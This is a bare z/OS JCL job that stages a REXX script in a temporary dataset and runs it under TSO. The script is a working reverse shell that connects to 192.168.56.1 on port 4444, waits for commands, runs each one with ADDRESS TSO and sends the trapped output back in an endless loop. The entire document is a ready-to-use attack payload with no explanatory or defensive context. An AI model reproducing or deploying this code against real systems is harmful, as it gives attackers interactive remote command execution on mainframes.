//USERJB JOB (USER),'job descript',MSGCLASS=H,
//   NOTIFY=&SYSUID,MSGLEVEL=(1,1),REGION=0M,COND=(0,NE)
//*
//S1 EXEC PGM=IEBGENER
//SYSPRINT  DD SYSOUT=*
//SYSIN     DD DUMMY
//SYSUT2    DD DSN=&&REXXTMP(REXXREV),SPACE=(TRK,(10,10,10)),
//             RECFM=FB,LRECL=80,DISP=(NEW,PASS),DSNTYPE=PDS
//SYSUT1    DD *
  /* REXX */
  /* TRACE i */
  IP = '192.168.56.1'
  PORT = '4444'
  n = "25"x
  rsock = SOCKET('INITIALIZE','CLIENT',2)
  rsock = SOCKET('SOCKET',2,'STREAM','TCP')
  parse var rsock socket_rc socketID .
  rsock = Socket('SETSOCKOPT',socketID,'SOL_SOCKET','SO_KEEPALIVE','ON')
  rsock = SOCKET('SETSOCKOPT',socketID,'SOL_SOCKET','SO_ASCII','On')
  rsock = SOCKET('SOCKETSETSTATUS','CLIENT')
  rsock = SOCKET('CONNECT',socketID,'AF_INET' PORT IP)
  READY = "READY"|| n
  rsock = SOCKET('SEND',socketID, READY)
  DO FOREVER
   in = SOCKET('RECV',socketID,10000)
   parse var in s_rc s_data_len s_data_text
   cmd = DELSTR(s_data_text, LENGTH(s_data_text))
   u = OUTTRAP('tso_out.')
   ADDRESS TSO cmd
   u = OUTTRAP(OFF)
   text = n
   DO i = 1 to tso_out.0
    text = text||tso_out.i||n
   END
   text = text||n||READY
   rsock = SOCKET('SEND',socketID, text)
  END
  return 0
/*
//S2        EXEC PGM=IKJEFT01,PARM='%REXXREV'
//SYSEXEC   DD DSN=&&REXXTMP,DISP=SHR
//SYSTSPRT  DD SYSOUT=*
//SYSTSIN   DD DUMMY
